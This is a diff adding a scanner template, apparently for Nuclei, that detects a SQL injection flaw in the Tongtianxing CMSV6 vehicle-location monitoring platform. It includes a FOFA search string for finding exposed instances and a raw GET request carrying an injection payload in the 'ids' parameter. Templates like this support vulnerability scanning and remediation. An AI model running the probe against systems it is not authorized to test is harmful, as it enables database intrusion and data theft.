@@ -1,0 +1,30 @@
+id: tongtianxing-sql-injection
+
+info:
+  name: 通天星CMSV6车载定位监控平台SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/808gps/"
+      通天星CMSV6车载定位监控平台在处理用户输入时未实施充分的过滤机制，导致输入数据被直接拼接至SQL查询语句中，形成可被利用的SQL注入漏洞。攻击者可通过构造恶意输入执行任意SQL代码，实现对目标数据库的敏感数据提取或状态篡改。
+  tags: 通天星
+
+http:
+- raw:
+  - |
+    GET /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip, deflate, br
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'result'
+  - type: word
+    part: body
+    words:
+    - '10001'
